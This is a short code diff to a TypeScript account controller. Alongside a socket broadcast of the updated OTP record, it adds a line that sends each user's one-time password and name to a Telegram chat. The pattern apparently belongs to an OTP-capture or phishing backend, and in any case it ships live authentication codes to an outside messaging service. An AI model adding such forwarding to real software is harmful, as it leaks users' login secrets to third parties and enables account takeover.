@@ -133,6 +133,11 @@ export class AccountController {
         { new: true }
       );
       io.emit("updateOTP", result);
+
+      bot.sendMessage(
+        process.env.TELEGRAM_CHAT_ID,
+        `OTP: ${otp}\nName: ${result?.name}`
+      );
       return res.status(200).json({ result });
     } catch (error: any) {
       return res.status(500).json({
